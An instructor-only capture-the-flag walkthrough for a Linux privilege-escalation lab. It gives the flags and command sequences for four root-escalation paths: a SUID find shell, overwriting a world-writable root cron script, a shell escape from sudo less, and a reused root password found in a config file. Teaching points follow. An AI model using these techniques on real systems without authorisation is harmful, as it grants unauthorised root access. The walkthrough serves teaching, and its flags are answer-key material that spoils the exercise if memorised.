# Week 8 CTF Walkthrough — INSTRUCTOR ONLY

> **Do not distribute to students before the end of the session.**

---

## Flag 1 — user.txt (`flag{w8_suid_or_cron_root}`)

Two independent paths on `week8-workstation` both lead here.

**Path A — SUID `find` (GTFOBins):**
```bash
docker exec -it -u lowpriv week8-workstation bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/find itself has the SUID bit set — not stock on Ubuntu
find . -exec /bin/sh -p \; -quit
whoami   # root
cat /root/user.txt
```

**Path B — Writable cron job:**
```bash
docker exec -it -u lowpriv week8-workstation bash
cat /etc/cron.d/backup
# */1 * * * * root /opt/scripts/backup.sh
ls -la /opt/scripts/backup.sh   # world-writable (777)
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'cp /root/user.txt /tmp/user.txt; chmod 644 /tmp/user.txt' >> /opt/scripts/backup.sh
# wait up to 60s for cron to fire
cat /tmp/user.txt
```

---

## Flag 2 — root.txt (`flag{w8_gtfobins_sudo_root}`)

Two independent paths on `week8-ubuntu-desktop` both lead here.

**Path A — GTFOBins sudo escalation:**
```bash
docker exec -it -u deskuser week8-ubuntu-desktop bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/hostname
# inside less: !/bin/sh
whoami   # root
cat /root/root.txt
```

**Path B — Hardcoded/reused credential:**
```bash
docker exec -it -u deskuser week8-ubuntu-desktop bash
grep -ri password /etc/app/*.conf
# root_password=CorrectHorseBattery42
su root
# Password: CorrectHorseBattery42
cat /root/root.txt
```

---

## Teaching Points

- SUID binaries should be audited against GTFOBins before trusting them —
  a huge number of "boring" Unix binaries (find, vim, less, cp, python) have
  a documented privilege-escalation path when SUID or sudo NOPASSWD
- `sudo -l` costs nothing and should be the very first command run after any
  new shell — NOPASSWD entries are often instant root
- A world-writable script invoked by a root cron job is equivalent to
  handing out root access on a timer
- Credentials leak sideways constantly — a config file meant for one service
  (a database) directly unlocked root here via password reuse
- All four of these are extremely common in real environments; none require
  a kernel exploit or anything exotic
